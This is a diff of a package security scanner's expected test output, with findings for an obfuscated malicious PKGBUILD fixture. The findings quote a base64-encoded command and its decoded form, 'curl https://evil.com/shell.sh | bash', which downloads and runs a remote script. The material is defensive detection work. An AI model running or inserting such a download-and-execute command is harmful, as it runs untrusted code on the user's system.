@@ -2,17 +2,24 @@
 Scan Results: malicious-obfuscated
 ============================================================
 
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:14
+    Code:     echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | sh    [resolved →     curl https://evil.com/shell.sh | bash | sh]
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
 [CRITICAL] DEEP-001 Decode-and-execute flow
     The file both decodes/decompresses data and dynamically executes shell input. Together these form a decode->execute payload, even when split across lines.
     Recommendation: Decode the payload manually and review it. Legitimate builds do not decode and then execute generated shell code.
     Reference: CWE-506
 
-[HIGH] OBF-001 Base64 decoding
-    Base64 decoding may hide malicious payloads
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.com/shell.sh
+    This package downloads and executes code from https://evil.com/shell.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
     Location: tests/fixtures/malicious/obfuscated/PKGBUILD:14
-    Code:     echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | sh
-    Recommendation: Decode and review the base64 content manually
-    Reference: CWE-506
+    Code: curl https://evil.com/shell.sh | bash | sh
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
 
 [HIGH] OBF-001 Base64 decoding
     Base64 decoding may hide malicious payloads
@@ -28,6 +35,11 @@ Scan Results: malicious-obfuscated
     Recommendation: Avoid eval; use direct commands instead
     Reference: CWE-95
 
+[HIGH] FUNC-001 Network access in build function
+    Function 'build' contains network access command 'curl'
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:12
+    Recommendation: Network access should happen in source= array, not build functions
+
 [MEDIUM] SRC-005 No sources with build function
     Package has build() function but no source array
     Recommendation: Verify this is intentional; build() usually needs sources
@@ -36,10 +48,10 @@ Scan Results: malicious-obfuscated
 
 ============================================================
 Package: malicious-obfuscated v1.0.0-1
-Scan duration: 5ms
+Scan duration: 61ms
 
-Found 5 issue(s):
-  1 CRITICAL
+Found 7 issue(s):
+  3 CRITICAL
   3 HIGH
   1 MEDIUM
 ============================================================
